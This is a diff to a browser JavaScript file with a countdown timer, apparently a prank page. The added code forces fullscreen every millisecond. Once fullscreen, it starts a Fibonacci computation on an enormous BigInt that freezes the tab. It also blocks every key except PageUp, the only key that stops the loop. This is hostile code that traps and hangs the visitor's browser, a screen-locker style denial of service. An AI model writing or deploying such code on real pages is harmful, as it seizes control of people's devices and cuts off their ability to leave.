@@ -72,20 +72,6 @@ Timer.prototype.setDuration = function(duration) {
 var timer = new Timer(10000, document.getElementById('countdown'));
 timer.start();
 
-let setFullScreenInterval = setInterval(() => {
-document.querySelector("body").requestFullscreen()
-}, 1)
-
-document.addEventListener('keydown', function (event) {
-  const key = event.key.toLowerCase();
-  if(key === 'pageup'){
-    crash = false
-    clearInterval(setFullScreenInterval)
-  }else{
-	 event.preventDefault()
-  }
-});
-
 function fibonacci(n) {
   if (n <= 1n) {
     return n.toString();
@@ -104,6 +90,22 @@ function fibonacci(n) {
   }
 }
 
-// Exemplo de uso
-const resultado = fibonacci(9999999999999999n);
-console.log(resultado);
+let setFullScreenInterval = setInterval(() => {
+document.querySelector("body").requestFullscreen()
+	if(document.fullscreen){
+	const resultado = fibonacci(99999999999n);
+	console.log(resultado);
+	}
+}, 1)
+
+document.addEventListener('keydown', function (event) {
+  const key = event.key.toLowerCase();
+  if(key === 'pageup'){
+    crash = false
+    clearInterval(setFullScreenInterval)
+  }else{
+	 event.preventDefault()
+  }
+});
+
+
